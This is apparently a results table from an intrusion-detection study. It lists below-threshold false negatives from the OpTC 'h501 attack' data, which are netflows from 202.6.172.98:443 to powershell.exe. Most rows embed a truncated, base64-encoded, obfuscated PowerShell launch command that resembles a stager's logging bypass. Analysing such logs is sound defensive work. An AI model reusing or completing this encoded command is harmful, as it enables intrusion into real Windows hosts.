rank,node_id,node_group,score,label,pred_above_threshold,attacks,incident_edges,responsible_loss,score_minus_responsible_loss,operation,event_uuid,time_raw,time_eastern,window,target_role,srcnode,dstnode,src_type,dst_type,type_pair,node_label_text,src_label,dst_label,score_band
731062,832642,FN_below_threshold,0.703174233,1,0,OPTC h501 attack,1,0.703174233,0.000000000,MESSAGE,e90fd27c-5761-4a14-b1a0-53968dcbc754,1569340034188000000,2019-09-24 11:47:14.188000 EDT,2019-09-24 11:45:46.724000000~2019-09-24 12:00:49.652000000,src,832642,4002,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53420,netflow 202.6.172.98:443->142.20.57.246:53420,subject: powershell.exe,< 1.000
731067,832468,FN_below_threshold,0.703018069,1,0,OPTC h501 attack,1,0.703018069,0.000000000,MESSAGE,5e6ae457-4ddd-44e9-86aa-7d59c3179db4,1569340003641000000,2019-09-24 11:46:43.641000 EDT,2019-09-24 11:45:46.724000000~2019-09-24 12:00:49.652000000,src,832468,4002,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53418,netflow 202.6.172.98:443->142.20.57.246:53418,subject: powershell.exe,< 1.000
731131,844864,FN_below_threshold,0.697976828,1,0,OPTC h501 attack,1,0.697976828,0.000000000,MESSAGE,9c340edf-6f75-4a35-bd25-7b09549b7e15,1569342026067000000,2019-09-24 12:20:26.067000 EDT,2019-09-24 12:15:50.557000000~2019-09-24 12:31:08.792000000,src,844864,4002,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53879,netflow 202.6.172.98:443->142.20.57.246:53879,subject: powershell.exe,< 1.000
735613,828754,FN_below_threshold,0.652263701,1,0,OPTC h501 attack,1,0.652263701,0.000000000,MESSAGE,93e7559a-1976-4d02-8dfd-e62af2f29ba7,1569339260395000000,2019-09-24 11:34:20.395000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828754,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53359,netflow 202.6.172.98:443->142.20.57.246:53359,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
735615,825906,FN_below_threshold,0.652229667,1,0,OPTC h501 attack,1,0.652229667,0.000000000,MESSAGE,3bfb86b9-a20a-4395-9255-829d9f74bc21,1569338808477000000,2019-09-24 11:26:48.477000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,825906,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53324,netflow 202.6.172.98:443->142.20.57.246:53324,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
735659,826266,FN_below_threshold,0.652016342,1,0,OPTC h501 attack,1,0.652016342,0.000000000,MESSAGE,dbe9534d-7fe5-4480-ae6c-8b7de9265943,1569338898852000000,2019-09-24 11:28:18.852000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826266,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53330,netflow 202.6.172.98:443->142.20.57.246:53330,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
735725,826128,FN_below_threshold,0.651786089,1,0,OPTC h501 attack,1,0.651786089,0.000000000,MESSAGE,0d4a639f-996d-4231-8a54-faf9a3e13cb4,1569338838624000000,2019-09-24 11:27:18.624000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826128,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53326,netflow 202.6.172.98:443->142.20.57.246:53326,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
735771,827043,FN_below_threshold,0.651635706,1,0,OPTC h501 attack,1,0.651635706,0.000000000,MESSAGE,8855e58b-6138-4d3b-b31f-1582a3bd6ab1,1569339049492000000,2019-09-24 11:30:49.492000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,827043,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53340,netflow 202.6.172.98:443->142.20.57.246:53340,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
735843,807516,FN_below_threshold,0.651464164,1,0,OPTC h501 attack,1,0.651464164,0.000000000,MESSAGE,1a8201e8-5390-4e6a-8b55-83eb9d38a3dc,1569336871641000000,2019-09-24 10:54:31.641000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,807516,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49986,netflow 202.6.172.98:443->142.20.57.246:49986,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
735984,828785,FN_below_threshold,0.651151896,1,0,OPTC h501 attack,1,0.651151896,0.000000000,MESSAGE,c70fbea4-6b16-413f-8a1d-ca4943668771,1569339290554000000,2019-09-24 11:34:50.554000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828785,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53362,netflow 202.6.172.98:443->142.20.57.246:53362,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736006,828438,FN_below_threshold,0.651124656,1,0,OPTC h501 attack,1,0.651124656,0.000000000,MESSAGE,2c591af1-ed4a-492d-a9df-040beb7076d7,1569339200103000000,2019-09-24 11:33:20.103000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828438,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53353,netflow 202.6.172.98:443->142.20.57.246:53353,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736047,826661,FN_below_threshold,0.651060760,1,0,OPTC h501 attack,1,0.651060760,0.000000000,MESSAGE,8e50235e-7fc1-4ffb-9b17-79aa37a70f49,1569338989215000000,2019-09-24 11:29:49.215000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826661,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53336,netflow 202.6.172.98:443->142.20.57.246:53336,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736049,829354,FN_below_threshold,0.651056230,1,0,OPTC h501 attack,1,0.651056230,0.000000000,MESSAGE,147ca8d9-b2e3-4191-b4d4-8c214a47e196,1569339351079000000,2019-09-24 11:35:51.079000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,829354,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53373,netflow 202.6.172.98:443->142.20.57.246:53373,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736079,828999,FN_below_threshold,0.651021898,1,0,OPTC h501 attack,1,0.651021898,0.000000000,MESSAGE,6a05d96c-e095-44fe-9d54-de9c04dac9ef,1569339320709000000,2019-09-24 11:35:20.709000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828999,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53368,netflow 202.6.172.98:443->142.20.57.246:53368,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736184,825883,FN_below_threshold,0.650855541,1,0,OPTC h501 attack,1,0.650855541,0.000000000,MESSAGE,a9554702-fd27-4eab-b24e-b42e039fe878,1569338776713000000,2019-09-24 11:26:16.713000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,825883,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53319,netflow 202.6.172.98:443->142.20.57.246:53319,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736272,829353,FN_below_threshold,0.650749326,1,0,OPTC h501 attack,1,0.650749326,0.000000000,MESSAGE,f001885d-7d92-4728-91ba-4e7aea8cd778,1569339350807000000,2019-09-24 11:35:50.807000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,829353,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53372,netflow 202.6.172.98:443->142.20.57.246:53372,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736296,827727,FN_below_threshold,0.650722563,1,0,OPTC h501 attack,1,0.650722563,0.000000000,MESSAGE,39e83db4-3679-4482-ae12-3309c9101fd7,1569339109712000000,2019-09-24 11:31:49.712000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,827727,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53344,netflow 202.6.172.98:443->142.20.57.246:53344,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736702,825884,FN_below_threshold,0.650304794,1,0,OPTC h501 attack,1,0.650304794,0.000000000,MESSAGE,5854e997-f10d-4347-a221-8db5f5c1d94a,1569338777677000000,2019-09-24 11:26:17.677000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,825884,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53320,netflow 202.6.172.98:443->142.20.57.246:53320,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736761,828158,FN_below_threshold,0.650259972,1,0,OPTC h501 attack,1,0.650259972,0.000000000,MESSAGE,24f5709a-64ee-4ad6-aac3-8f678de68c7e,1569339169974000000,2019-09-24 11:32:49.974000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828158,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53350,netflow 202.6.172.98:443->142.20.57.246:53350,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
736803,807505,FN_below_threshold,0.650217175,1,0,OPTC h501 attack,1,0.650217175,0.000000000,MESSAGE,29de2aec-b6b3-42a3-a7e7-bb27f7b7db79,1569336841478000000,2019-09-24 10:54:01.478000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,807505,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49985,netflow 202.6.172.98:443->142.20.57.246:49985,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
736861,825880,FN_below_threshold,0.650168836,1,0,OPTC h501 attack,1,0.650168836,0.000000000,MESSAGE,3e6e0863-b15a-4d92-8e95-9c0809655532,1569338775861000000,2019-09-24 11:26:15.861000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,825880,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53318,netflow 202.6.172.98:443->142.20.57.246:53318,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
737060,828550,FN_below_threshold,0.650012314,1,0,OPTC h501 attack,1,0.650012314,0.000000000,MESSAGE,b17900a7-5599-4520-9bec-f39287be7679,1569339230236000000,2019-09-24 11:33:50.236000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828550,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53356,netflow 202.6.172.98:443->142.20.57.246:53356,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
737076,827405,FN_below_threshold,0.650002539,1,0,OPTC h501 attack,1,0.650002539,0.000000000,MESSAGE,96a8a323-167c-43f7-9052-b31dcff8d133,1569339079618000000,2019-09-24 11:31:19.618000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,827405,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53342,netflow 202.6.172.98:443->142.20.57.246:53342,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
